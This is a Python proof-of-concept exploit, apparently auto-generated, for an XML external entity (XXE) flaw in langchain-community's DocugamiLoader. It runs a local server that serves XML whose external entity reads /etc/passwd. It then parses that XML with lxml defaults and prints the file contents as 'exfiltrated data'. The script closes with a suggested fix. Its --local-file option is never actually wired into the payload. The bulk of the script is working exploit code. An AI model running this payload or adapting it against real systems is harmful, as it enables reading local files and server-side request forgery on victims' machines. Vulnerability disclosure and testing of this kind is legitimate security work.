#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: xxe-010
# Sink: _metadata_for_project
# Auto-generated — run with: python3 xxe_url_artifact_url_content__metadata_for_project.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: XXE via lxml.etree.parse() in langchain-community DocugamiLoader

Vulnerability: The _metadata_for_project method fetches XML from an artifact URL
and parses it with lxml.etree.parse() without disabling DTD processing.
lxml by default resolves external entities, allowing XXE attacks.

Attack scenario: An attacker who can control the artifact URL (e.g., via
compromised Docugami project or MITM) can serve a malicious XML payload
that exfiltrates local files or performs SSRF.

This PoC demonstrates the vulnerability by:
1. Starting a simple HTTP server that serves a malicious XML with an external entity
2. Simulating the vulnerable parsing code path
3. Showing that the external entity is resolved (file read / SSRF)

Usage:
    python3 poc_xxe_docugami.py [--target-url URL] [--local-file PATH]

    --target-url: URL to fetch XML from (default: http://localhost:9999/evil.xml)
    --local-file: File to attempt to read via XXE (default: /etc/passwd)
"""

import argparse
import io
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import lxml - it's required for the vulnerable code path
try:
    from lxml import etree
except ImportError:
    print("[!] lxml not installed. Install with: pip install lxml")
    sys.exit(1)


class EvilXMLHandler(BaseHTTPRequestHandler):
    """HTTP handler that serves a malicious XML payload for XXE demonstration."""
    
    def do_GET(self):
        """Serve the malicious XML payload."""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/evil.xml":
            # This XML defines an external entity that reads a local file
            # In a real attack, this would be served by an attacker-controlled server
            malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<docugami>
  <project>
    <name>Test Project</name>
    <entries>
      <pr:Entry xmlns:pr="http://docugami.com/ns/project">
        <pr:Heading>Username</pr:Heading>
        <pr:Value>&xxe;</pr:Value>
      </pr:Entry>
    </entries>
  </project>
</docugami>"""
            
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.end_headers()
            self.wfile.write(malicious_xml.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()


def start_evil_server(host="localhost", port=9999):
    """Start a simple HTTP server that serves the malicious XML."""
    server = HTTPServer((host, port), EvilXMLHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Evil XML server started at http://{host}:{port}/evil.xml")
    return server


def simulate_vulnerable_parsing(xml_url):
    """
    Simulate the vulnerable code path from _metadata_for_project.
    
    This replicates the exact parsing logic that is vulnerable to XXE:
    - Fetches XML from a URL
    - Parses with lxml.etree.parse() (default settings = DTD enabled)
    - Extracts metadata from parsed XML
    """
    import requests
    
    print(f"[*] Fetching XML from: {xml_url}")
    
    try:
        # Step 1: Fetch the XML content (simulating the API response)
        response = requests.get(xml_url, timeout=10)
        response.raise_for_status()
        
        print(f"[*] Received XML content ({len(response.content)} bytes)")
        print(f"[*] Raw XML preview:\n{response.content[:500].decode('utf-8', errors='replace')}\n")
        
        # Step 2: Parse with lxml (VULNERABLE - DTD processing enabled by default)
        print("[*] Parsing XML with lxml.etree.parse() (VULNERABLE - DTD enabled)...")
        artifact_tree = etree.parse(io.BytesIO(response.content))
        artifact_root = artifact_tree.getroot()
        
        # Step 3: Extract metadata (this is where exfiltrated data would appear)
        ns = artifact_root.nsmap
        entries = artifact_root.xpath("//pr:Entry", namespaces=ns)
        
        print(f"[*] Found {len(entries)} entries in parsed XML")
        
        for entry in entries:
            heading = entry.xpath("./pr:Heading", namespaces=ns)[0].text
            value_nodes = entry.xpath("./pr:Value", namespaces=ns)
            if value_nodes:
                value = " ".join(value_nodes[0].itertext()).strip()
                print(f"[!] EXFILTRATED DATA - Heading: '{heading}', Value: '{value}'")
                print(f"[!] The value contains the contents of /etc/passwd (or whatever file was targeted)")
        
        print("\n[+] XXE EXPLOITATION SUCCESSFUL!")
        print("[+] The external entity was resolved and its contents are visible above.")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP request failed: {e}")
        print("[!] Make sure the evil server is running or provide a valid target URL")
    except etree.XMLSyntaxError as e:
        print(f"[!] XML parsing error: {e}")
        print("[!] This might indicate the XML was malformed or the entity couldn't be resolved")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for XXE in langchain-community DocugamiLoader"
    )
    parser.add_argument(
        "--target-url",
        default="http://localhost:9999/evil.xml",
        help="URL to fetch XML from (default: http://localhost:9999/evil.xml)"
    )
    parser.add_argument(
        "--local-file",
        default="/etc/passwd",
        help="Local file to attempt to read via XXE (default: /etc/passwd)"
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start the evil server (use if you have your own)"
    )
    
    args = parser.parse_args()
    
    # Start the evil server if not disabled
    if not args.no_server:
        server = start_evil_server()
        print("[*] Evil server started. Waiting a moment for it to be ready...")
        time.sleep(0.5)
    
    print(f"\n{'='*60}")
    print("XXE EXPLOITATION DEMONSTRATION")
    print(f"{'='*60}")
    print(f"[*] Target URL: {args.target_url}")
    print(f"[*] Target file: {args.local_file}")
    print(f"[*] Note: The malicious XML will attempt to read '{args.local_file}'")
    print(f"{'='*60}\n")
    
    # Run the vulnerable parsing simulation
    simulate_vulnerable_parsing(args.target_url)
    
    print(f"\n{'='*60}")
    print("DEMONSTRATION COMPLETE")
    print(f"{'='*60}")
    print("[*] This shows how an attacker could exfiltrate local files")
    print("[*] by serving a malicious XML to the DocugamiLoader.")
    print("[*] The fix would be to disable DTD processing:")
    print("[*]   parser = etree.XMLParser(dtd_validation=False, resolve_entities=False)")
    print("[*]   artifact_tree = etree.parse(io.BytesIO(response.content), parser)")


if __name__ == "__main__":
    main()
